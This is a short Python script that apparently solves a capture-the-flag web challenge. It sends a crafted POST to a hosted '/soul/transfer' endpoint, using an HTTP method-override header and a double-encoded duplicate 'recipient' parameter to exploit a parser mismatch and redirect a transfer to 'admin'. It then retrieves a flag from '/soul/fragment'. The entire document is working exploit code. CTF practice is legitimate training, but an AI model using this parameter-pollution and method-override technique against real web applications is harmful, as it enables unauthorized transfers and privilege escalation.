import requests

BASE_URL = "https://byteme-soul-split.onrender.com"

def solve():
    session = requests.Session()

    headers = {
        "X-HTTP-Method-Override": "PATCH",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    payload = "recipient=guest&recipient%253Dadmin&amount=100"

    print(f"[*] Dispatching split-parser payload to {BASE_URL}/soul/transfer...")
    res = session.post(f"{BASE_URL}/soul/transfer", data=payload, headers=headers, allow_redirects=False)

    print(f"[*] Response Status: {res.status_code}")
    print(f"[*] Redirect Location: {res.headers.get('Location')}")

    if res.status_code == 302 and res.headers.get("Location") == "/soul/fragment":
        print("[+] Session awakened! Fetching flag from /soul/fragment...")
        frag_res = session.get(f"{BASE_URL}/soul/fragment")
        if "OWASP{" in frag_res.text or "FLAG{" in frag_res.text:
            print("[+] Flag retrieved successfully:")
            for line in frag_res.text.splitlines():
                if "{" in line and "}" in line:
                    print(f"    {line.strip()}")
            return True
    else:
        print("[-] Exploit rejected. Response:")
        print(res.text[:300])
        return False

if __name__ == "__main__":
    solve()
